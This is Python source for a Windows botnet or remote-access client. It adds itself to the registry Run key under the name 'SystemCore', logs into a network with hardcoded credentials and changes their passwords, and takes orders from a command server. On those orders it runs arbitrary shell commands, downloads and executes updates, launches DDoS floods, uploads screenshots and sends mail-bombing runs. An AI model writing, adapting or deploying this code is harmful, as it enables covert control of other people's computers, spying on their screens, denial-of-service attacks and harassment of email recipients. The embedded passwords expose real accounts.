import pyautogui
import requests
from socket import gethostname
import subprocess
import sys
import time
import uuid
import win32api
import win32con

import DDOS
import wirelessLogin
from _zmail import send_mail


version = 5
exePath = sys.argv[0]
url = "http://rbsi.yxzl.top:5001/"
key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,
                          "Software\Microsoft\Windows\CurrentVersion\Run",
                          0,
                          win32con.KEY_WRITE)
win32api.RegSetValueEx(key, "SystemCore", 0, win32con.REG_SZ, exePath)


def login_network():
    users = [{"username": "xiongtianhu", "password": "qwer-1234"},
             {"username": "J2012009", "password": "poiu-1234"}]
    if check_network():
        print("外网请求成功，跳过登录！")
    else:
        success = False
        while not success:
            if wirelessLogin.login_others():
                return True
            for user in users:
                try:
                    login = wirelessLogin.wirelessLogin(user["username"], user["password"])
                    login.get_cookie()
                    login.get_id()
                    login.change_password()
                    login.login(check_function=check_network)
                    return True
                except:
                    pass


def init():
    login_network()
    global action
    succeed = False
    action = -1
    while not succeed:
        try:
            r = requests.post(url + "init", data={"name": name}).json()
            if r["version"] > version:
                print("检查到更新，开始下载...")
                try:
                    new_version = r["version"]
                    download_address = r["download_address"]
                    r = requests.get(download_address)
                    exe_name = exePath.split("/" if "/" in exePath else "\\")[-1].split("-")[0] + "-" + str(new_version) + ".exe"
                    with open(exe_name, "wb") as f:
                        f.write(r.content)
                    _key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,
                                               r"Software",
                                               0,
                                               win32con.KEY_WRITE)
                    win32api.RegSetValueEx(_key, "RBSI-old", 0, win32con.REG_SZ, exePath)
                    subprocess.call("/".join(exePath.split("/" if "/" in exePath else "\\")[:-1]) + "/" + exe_name,
                                    shell=True, stdin=subprocess.PIPE,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
                    raise SystemExit
                except SystemExit:
                    raise SystemExit
                except:
                    print("检测到新版本，但是更新失败。")
            action = r["action"]
            print("服务器通讯初始化成功！")
            send_message("初始化成功！")
            succeed = True
        except SystemExit:
            raise SystemExit
        except:
            print("服务器通讯初始化失败！15秒后重新尝试...")
            time.sleep(15)


def check_network():
    try:
        if requests.post(url + "check-network").text == "Success":
            return True
        else:
            return False
    except:
        return False


def send_message(message):
    requests.post(url + "message", data={"name": name, "message": message})


mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
mac = "-".join([mac[e:e + 2] for e in range(0, 11, 2)])
name = gethostname() + "_" + mac
print("当前设备名称：" + name)

action = -1
init()

while True:
    try:
        while True:
            data = {"name": name, "action": action}
            response = requests.post(url + "connect", data=data)
            response = response.json()
            print(response)

            waited = False

            if response.get("stop-once"):
                send_message("stop-once执行")
                raise SystemExit
            if response.get("stop-forever"):
                send_message("stop-forever执行")
                key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,
                                          "Software\Microsoft\Windows\CurrentVersion\Run",
                                          0,
                                          win32con.KEY_WRITE)
                win32api.RegSetValueEx(key, "SystemCore", 0, win32con.REG_SZ, "")
                raise SystemExit

            if response.get("show-version"):
                send_message("展示版本执行...")
                subprocess.call("mshta vbscript:msgbox(\"当前版本：%s\",64,\"RBSI版本\")(window.close)" % version,
                                shell=True, stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE)
                send_message("展示版本成功!")
                waited = True

            action = response["action"]
            if response["actions"]:
                for i in response["actions"]:
                    if "all" not in i["send_to"] and name not in i["send_to"]:
                        continue
                    subprocess.call(i["command"], shell=True, stdin=subprocess.PIPE,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
                waited = True

            if response["DDOS"]["do"]:
                DDOS.run(times=response["DDOS"]["times"],
                         host=response["DDOS"]["host"],
                         page=response["DDOS"]["page"],
                         port=response["DDOS"]["port"])
                send_message("DDOS线程启动")

            if response.get("getScreen"):
                send_message("尝试截图...")
                pyautogui.screenshot("Screenshot.png")
                requests.post(url + "upload", data={"name": name},
                              files={"file": open("Screenshot.png",
                                                  "rb")})
                send_message("截图成功！")

            if response["mail-attack"]["do"]:
                if response["mail-attack"]["easy"]:
                    for i in range(response["mail-attack"]["times"]):
                        send_mail(from_address=response["mail-attack"]["from-address"],
                                  from_password=response["mail-attack"]["from-password"],
                                  to_address=response["mail-attack"]["to-address"])
                else:
                    for i in range(response["mail-attack"]["times"]):
                        send_mail(from_address=response["mail-attack"]["from-address"],
                                  from_password=response["mail-attack"]["from-password"],
                                  to_address=response["mail-attack"]["to-address"],
                                  from_name=response["mail-attack"]["from-name"],
                                  title=response["mail-attack"]["title"],
                                  content=response["mail-attack"]["content"])
                raise KeyboardInterrupt

            if not waited:
                time.sleep(5)
    except KeyboardInterrupt:
        send_message("邮件轰炸成功发送！")
    except SystemExit:
        send_message("尝试退出...")
        raise SystemExit
    except:
        print("未知错误！程序即将重新初始化...")
        init()
